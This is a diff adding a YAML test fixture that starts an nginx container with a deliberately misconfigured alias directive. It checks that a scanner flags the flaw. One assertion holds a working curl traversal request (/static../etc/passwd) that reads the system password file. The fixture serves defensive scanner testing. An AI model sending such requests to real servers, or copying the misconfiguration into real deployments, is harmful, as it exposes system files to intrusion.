@@ -1,0 +1,32 @@
+name: nginx-alias-traversal
+description: "nginx misconfigured alias directive allowing path traversal"
+tags: [nginx, traversal, web]
+
+services:
+  nginx:
+    image: nginx:alpine
+    ports: ["9209:80"]
+    volumes:
+      - ./nginx-alias/nginx.conf:/etc/nginx/conf.d/default.conf:ro
+      - ./nginx-alias/html:/app:ro
+
+ready:
+  cmd: "curl -sf http://localhost:9209/ >/dev/null"
+  timeout: 30s
+  interval: 2s
+
+assertions:
+  - name: exploit-alias-traversal-reads-passwd
+    type: command
+    expect:
+      command: "curl -sf --path-as-is http://localhost:9209/static../etc/passwd | grep -q root"
+      exit_code: 0
+
+  - name: detects-nginx-alias-traversal
+    type: beacon
+    target: localhost:9209
+    args: ["--no-enrich", "--scanners", "nginx", "--deep", "--permission-confirmed"]
+    expect:
+      check_id: web.nginx_alias_traversal
+
+timeout: 5m
